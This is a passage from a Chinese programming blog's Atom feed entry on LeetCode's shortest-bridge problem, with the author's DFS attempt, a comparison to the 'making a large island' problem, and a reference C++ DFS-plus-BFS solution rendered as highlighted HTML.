class=&quot;number&quot;&gt;1&lt;/span&gt;, y, index);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(grid, x&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;, y, index);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flag) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(indexMap[x][y]==&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                edgex[edgecount]=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                edgey[edgecount]=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                edgecount++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(indexMap[x][y]==&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                edgei[edgeicount]=x;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                edgej[edgeicount]=y;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                edgeicount++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;和之前写的一道题有点像，&lt;a href=&quot;https://leetcode.cn/problems/making-a-large-island/&quot;&gt;827. 最大人工岛&lt;/a&gt;&lt;br&gt;&lt;code&gt;827. 最大人工岛&lt;/code&gt;我先dfs找到所有连通子图和包围岛的0点，然后找这些点中有无同时包围多个岛的，把他们的面积加起来取最大值&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;这道题也可以使用相同的方法，找到每个岛屿的边界点，然后计算边界点的距离(只有两个岛，两个岛之间肯定是可以连通的，且不管使用那条途径，最短距离一定是 $ abs(x_1 - x_2) + abs(y_1-y_2)-1 $)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;看答案&quot;&gt;&lt;a href=&quot;#看答案&quot; class=&quot;headerlink&quot; title=&quot;看答案&quot;&gt;&lt;/a&gt;看答案&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;dfs&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; x, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; y, vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt;&amp;amp; grid, queue&amp;lt;pair&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt; &amp;amp;qu)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (x &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || y &amp;lt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; || x &amp;gt;= grid.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;() || y &amp;gt;= grid[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;].&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;() || grid[x][y] != &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        qu.&lt;span class=&quot;built_in&quot;&gt;emplace&lt;/span&gt;(x, y);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        grid[x][y] = &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(x - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, y, grid, qu);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(x + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, y, grid, qu);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(x, y - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, grid, qu);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(x, y + &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, grid, qu);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;shortestBridge&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt;&amp;amp; grid)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n = grid.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        vector&amp;lt;vector&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt; dirs = &amp;#123;&amp;#123;&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;, &amp;#123;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;&amp;#125;, &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&amp;#125;, &amp;#123;&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;&amp;#125;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; n; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; n; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (grid[i][j] == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    queue&amp;lt;pair&amp;lt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt;&amp;gt;&amp;gt; qu;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;built_in&quot;&gt;dfs&lt;/span&gt;(i, j, grid, qu);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; step = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;while&lt;/span&gt; (!qu.&lt;span class=&quot;built_in&quot;&gt;empty&lt;/span&gt;()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; sz = qu.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; sz; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;span class=&quot;keyword&quot;&gt;auto&lt;/span&gt; [x, y] = qu.&lt;span class=&quot;built_in&quot;&gt;front&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            qu.&lt;span class=&quot;built_in&quot;&gt;pop&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; k = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; k &amp;lt; &lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;; k++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; nx = x + dirs[k][&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; ny = y + dirs[k][&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (nx &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; ny &amp;gt;= &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; nx &amp;lt; n &amp;amp;&amp;amp; ny &amp;lt; n) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (grid[nx][ny] == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        qu.&lt;span class=&quot;built_in&quot;&gt;emplace&lt;/span&gt;(nx, ny);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        grid[nx][ny] = &lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                    &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (grid[nx][ny] == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; step;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                        step++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
</feed>
